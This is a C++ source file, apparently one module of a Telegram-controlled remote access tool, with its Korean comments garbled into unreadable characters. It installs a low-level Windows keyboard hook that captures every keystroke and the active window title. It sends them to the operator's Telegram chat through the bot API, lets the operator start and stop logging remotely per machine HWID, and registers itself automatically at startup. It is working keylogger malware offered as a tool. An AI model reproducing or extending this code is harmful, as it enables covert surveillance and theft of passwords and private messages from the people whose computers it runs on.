// Command_Key.cpp  (������: �⺻ ��� / �ѱ� ��ȯ ���� / �齺���̽��� "[backspace]" ��ū�� ���)
// ���:
//  - /[HWID] key        �� �� ��(�ؽ�Ʈ+��ư) UI
//  - /[HWID] key on/off �� ����/���� (���� ����ÿ��� �ȳ�, ���� ����)
//  - Ű �Է� ���۸�(2�� ���� �߰� �Է� ���� �� ����):
//        [������Ȱ��â]
//        <�Է� ���� ����>   �� Backspace�� "[backspace]"�θ� ���
//  - Shift/Ư������/��ҹ��� ����
//  - UTF-8 ��ư(400 ����), 3�� UI ��ٿ�, .CRT$XCU �ڵ����

#include "Commands.h"
#include "TelegramApi.h"
#include "Config.h"

#define NOMINMAX
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <unordered_map>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "winhttp.lib")

// ==============================
// ���� ����
// ==============================
static HHOOK        g_hHook = nullptr;
static std::wstring g_buffer;       // ���� ���� (Backspace�� [backspace] ��ū���θ� ���)
static std::mutex   g_mutex;
static UINT_PTR     g_timerId = 0;
static std::atomic<bool> g_running{ false };
static long long    g_chatId = 0;

// ==============================
// ��ƿ
// ==============================
static std::wstring GetSpecialKeyName(WPARAM vk) {
    switch (vk) {
    case VK_RETURN:  return L"[Enter]";
    case VK_TAB:     return L"[Tab]";
    case VK_BACK:    return L"[backspace]"; // �� �ܼ� ��ū
    case VK_ESCAPE:  return L"[Esc]";
    case VK_SPACE:   return L" ";
    case VK_CONTROL: return L"[Ctrl]";
    case VK_SHIFT:   return L"[Shift]";
    case VK_MENU:    return L"[Alt]";
    case VK_LWIN:
    case VK_RWIN:    return L"[Win]";
    case VK_DELETE:  return L"[Delete]";
    case VK_LEFT:    return L"[Left]";
    case VK_RIGHT:   return L"[Right]";
    case VK_UP:      return L"[Up]";
    case VK_DOWN:    return L"[Down]";
    default:         return L"";
    }
}

static std::wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"(�� �� ����)";
    wchar_t buf[256];
    int len = GetWindowTextW(hwnd, buf, 256);
    return (len > 0) ? std::wstring(buf, len) : L"(���� ����)";
}

// ToUnicode�� Ű���� ���� (Shift/Caps/Num/Scroll + ��/�� ������̾�)
static void BuildKeyState(BYTE ks[256]) {
    ZeroMemory(ks, 256);
    auto setDown = [&](int vk) { if (GetAsyncKeyState(vk) & 0x8000) ks[vk] = 0x80; };
    setDown(VK_SHIFT);   setDown(VK_LSHIFT);   setDown(VK_RSHIFT);
    setDown(VK_CONTROL); setDown(VK_LCONTROL); setDown(VK_RCONTROL);
    setDown(VK_MENU);    setDown(VK_LMENU);    setDown(VK_RMENU);
    if (GetKeyState(VK_CAPITAL) & 1) ks[VK_CAPITAL] = 1;
    if (GetKeyState(VK_NUMLOCK) & 1) ks[VK_NUMLOCK] = 1;
    if (GetKeyState(VK_SCROLL) & 1) ks[VK_SCROLL] = 1;
}

// ==============================
// ����(2�� ���Է� ��): [������Ȱ��â]\n<����>
// ==============================
static VOID CALLBACK TimerProc(HWND, UINT, UINT_PTR, DWORD) {
    std::wstring msg;
    {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (!g_buffer.empty()) { msg.swap(g_buffer); }
    }
    if (msg.empty() || g_chatId == 0) return;

    std::wstring title = GetActiveWindowTitle();
    std::wstring out = L"[" + title + L"]\n" + msg;

    SendText(g_chatId, WToUtf8(out)); // UTF-8 ����
}

// ==============================
// Ű���� ��ŷ
// ==============================
static LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        const KBDLLHOOKSTRUCT* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        // ���� Backspace�� �������� �ʰ� "[backspace]" ��ū�� ���
        if (kb->vkCode == VK_BACK) {
            {
                std::lock_guard<std::mutex> lock(g_mutex);
                g_buffer += L"[backspace]";
            }
            if (g_timerId) KillTimer(NULL, g_timerId);
            g_timerId = SetTimer(NULL, 1, 2000, TimerProc);
            return CallNextHookEx(g_hHook, code, wParam, lParam);
        }

        // ���� ������ Ű: ToUnicode�� ���� ����/��ȣ ���� (Shift/Ư������/��ҹ��� ����)
        BYTE ks[256]; BuildKeyState(ks);
        UINT scan = kb->scanCode;
        if (kb->flags & LLKHF_EXTENDED) scan |= 0xE000;

        WCHAR buf[16] = { 0 };
        int r = ToUnicode(kb->vkCode, scan, ks, buf, 16, 0);
        if (r < 0) { WCHAR dummy[16]; ToUnicode(kb->vkCode, scan, ks, dummy, 16, 0); r = 0; } // dead-key �ʱ�ȭ

        std::wstring keyText;
        if (r > 0) {
            keyText.assign(buf, buf + r);
            // ���ĺ� 1���ڸ� Shift ^ Caps �� ��ҹ��� ����
            if (keyText.size() == 1 && iswalpha(keyText[0])) {
                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                bool caps = (GetKeyState(VK_CAPITAL) & 1) != 0;
                bool upper = shift ^ caps;
                keyText[0] = upper ? towupper(keyText[0]) : towlower(keyText[0]);
            }
            // ����+Shift(1��!) ���� BuildKeyState�� �ڵ� �ݿ���
        }
        else {
            keyText = GetSpecialKeyName(kb->vkCode); // ��: [Enter], [Tab], ���� ��
        }

        {
            std::lock_guard<std::mutex> lock(g_mutex);
            g_buffer += keyText;
        }
        if (g_timerId) KillTimer(NULL, g_timerId);
        g_timerId = SetTimer(NULL, 1, 2000, TimerProc);
    }
    return CallNextHookEx(g_hHook, code, wParam, lParam);
}

static DWORD WINAPI HookThread(LPVOID) {
    MSG msg;
    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandleW(NULL), 0);
    if (!g_hHook) return 0;
    while (GetMessageW(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); }
    UnhookWindowsHookEx(g_hHook); g_hHook = nullptr;
    return 0;
}

static bool StartKeyLogger(long long chatId) {
    if (g_running.exchange(true)) return false; // �̹� ON
    g_chatId = chatId;
    CreateThread(NULL, 0, HookThread, NULL, 0, NULL);
    return true;
}
static bool StopKeyLogger() {
    if (!g_running.exchange(false)) return false; // �̹� OFF
    if (g_hHook) { UnhookWindowsHookEx(g_hHook); g_hHook = nullptr; }
    if (g_timerId) { KillTimer(NULL, g_timerId); g_timerId = 0; }
    g_chatId = 0;
    return true;
}

// ==============================
// ��ư UI (UTF-8) + 3�� ��ٿ�
// ==============================
struct UiKey {
    long long chatId; std::string hwid;
    bool operator==(const UiKey& o) const noexcept { return chatId == o.chatId && hwid == o.hwid; }
};
struct UiKeyHash {
    size_t operator()(const UiKey& k) const noexcept {
        std::hash<long long> h1; std::hash<std::string> h2; return (h1(k.chatId) * 1315423911u) ^ h2(k.hwid);
    }
};
static std::unordered_map<UiKey, ULONGLONG, UiKeyHash> g_lastUiSend;
static std::mutex g_lastUiSendMu;

static bool ShouldThrottleUI(long long chatId, const std::string& hwid8, ULONGLONG ms = 3000) {
    std::lock_guard<std::mutex> lk(g_lastUiSendMu);
    ULONGLONG now = GetTickCount64(); UiKey k{ chatId, hwid8 };
    auto it = g_lastUiSend.find(k);
    if (it != g_lastUiSend.end()) {
        if (now - it->second < ms) return true;
        it->second = now; return false;
    }
    g_lastUiSend.emplace(k, now); return false;
}

// ���� UTF-8�� ����� form-urlencoded�� ���� (400 ����)
static bool SendTextWithButtons_Multi_Local(long long chatId,
    const std::wstring& textW,
    const std::vector<std::string>& labelsUtf8,
    const std::vector<std::string>& callbacks,
    int columns = 2)
{
    std::string markup = "{\"inline_keyboard\":[";
    const int n = (int)labelsUtf8.size();
    for (int i = 0; i < n; ) {
        if (i) markup += ",";
        markup += "[";
        for (int c = 0; c < columns && i < n; ++c, ++i) {
            if (c) markup += ",";
            markup += "{\"text\":\"" + JsonEscape(labelsUtf8[i]) +
                "\",\"callback_data\":\"" + JsonEscape(callbacks[i]) + "\"}";
        }
        markup += "]";
    }
    markup += "]}";

    std::string body = "chat_id=" + std::to_string(chatId) +
        "&text=" + UrlEncode(WToUtf8(textW)) +
        "&reply_markup=" + UrlEncode(markup);

    std::wstring path = L"/bot" + BOT_TOKEN + L"/sendMessage";
    std::string resp; bool ok = HttpPostForm(path, body, resp);
    return ok && resp.find("\"ok\":true") != std::string::npos;
}

static bool SendTextWithButtons_Multi_W(long long chatId,
    const std::wstring& textW,
    const std::vector<std::wstring>& labelsW,
    const std::vector<std::string>& callbacks,
    int columns = 2)
{
    std::vector<std::string> labelsUtf8; labelsUtf8.reserve(labelsW.size());
    for (const auto& w : labelsW) labelsUtf8.push_back(WToUtf8(w));
    return SendTextWithButtons_Multi_Local(chatId, textW, labelsUtf8, callbacks, columns);
}

// �� �� ���� + ����
static bool SendKeyUI(long long chatId, const std::string& hwid8) {
    if (ShouldThrottleUI(chatId, hwid8)) return true; // 3�� ��ٿ�

    std::wstring text =
        L"[" + std::wstring(hwid8.begin(), hwid8.end()) + L"] Ű ����͸�\n"
        L"�ش� PC�� Ű ����͸��� �����ұ��?";

    std::vector<std::wstring> labelsW = { L"����", L"����" };
    std::vector<std::string>  callbacks = {
        "/" + hwid8 + " key on",
        "/" + hwid8 + " key off"
    };
    return SendTextWithButtons_Multi_W(chatId, text, labelsW, callbacks, 2);
}

// ==============================
// /key �ڵ鷯 + �ڵ� ���
// ==============================
static bool KeyHandler(long long chatId, const std::string& hwid8, const std::string& argsUtf8)
{
    auto trim = [](const std::string& s) {
        size_t a = s.find_first_not_of(" \t\r\n");
        size_t b = s.find_last_not_of(" \t\r\n");
        if (a == std::string::npos) return std::string();
        return s.substr(a, b - a + 1);
        };
    std::string arg = trim(argsUtf8);

    // �� ���� �Ǵ� "key"/"ui"/"menu" �� UI
    if (arg.empty() || arg == "key" || arg == "ui" || arg == "menu") {
        return SendKeyUI(chatId, hwid8);
    }

    if (arg == "on" || arg == "start") {
        if (StartKeyLogger(chatId)) {
            SendText(chatId, WToUtf8(L"����͸� ����: Ű �Է��� �����Ǹ� ���۵˴ϴ�."));
        }
        return true;
    }
    if (arg == "off" || arg == "stop") {
        if (StopKeyLogger()) {
            SendText(chatId, WToUtf8(L"����͸� ����."));
        }
        return true;
    }

    // �� �� ���ڵ� UI�� ����
    return SendKeyUI(chatId, hwid8);
}

namespace {
    struct KeyAutoreg { KeyAutoreg() { RegisterCommand("key", &KeyHandler); } };
    extern "C" void __cdecl __init_Command_Key() { static KeyAutoreg s_reg; }
    using InitFn = void(__cdecl*)();
#pragma section(".CRT$XCU", read)
    __declspec(allocate(".CRT$XCU")) InitFn p_init_Command_Key = __init_Command_Key;
}
